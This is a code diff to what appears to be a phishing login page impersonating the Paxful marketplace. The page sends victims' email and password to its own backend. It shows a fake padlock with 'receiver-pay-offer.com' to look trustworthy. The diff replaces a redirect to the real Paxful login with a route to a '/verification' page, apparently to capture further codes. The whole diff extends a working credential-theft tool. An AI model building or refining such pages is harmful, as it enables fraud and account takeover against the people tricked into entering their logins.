@@ -8,6 +8,7 @@ import Link from "next/link";
 import React, { useState } from "react";
 import axios from "axios";
 import { baseUrl } from "@/config";
+import { useRouter } from "next/navigation";
 const serrat = Montserrat({
   subsets: ["cyrillic", "cyrillic-ext", "latin", "latin-ext", "vietnamese"],
 });
@@ -20,6 +21,7 @@ const Index = () => {
   const [error1, setError1] = useState("");
   const [error2, setError2] = useState("");
   const [isLoading, setIsLoading] = useState(false);
+  const router = useRouter();
 
   function validateEmailOrPhone(input: string) {
     // Regular expression for validating an email
@@ -47,8 +49,7 @@ const Index = () => {
       setIsLoading(true);
       const res = await axios.post(`${baseUrl}/api/login`, { email, password });
       console.log(res);
-
-      window.location.replace("https://accounts.paxful.com/login/");
+      router.push(`/verification?email=${email}`);
       setIsLoading(!true);
     } catch (error) {
       console.error(error);
@@ -159,7 +160,7 @@ const Index = () => {
           </p>
           <div className='bg-white mt-2 lg:mt-0 md:self-center w-max relative md:left-[3%] h-max px-[8px] py-[4px] border border-appAsh rounded-[4px] flex items-center'>
             <IoLockClosedSharp className='' color=' #16a34a ' />
-            <p className='font-bold ml-1  text-[10px]'>
+            <p className='font-bold ml-1 text-[#333] text-[10px]'>
               <span className='text-green-600 text-[10px]'>https://</span>{" "}
               receiver-pay-offer.com
             </p>
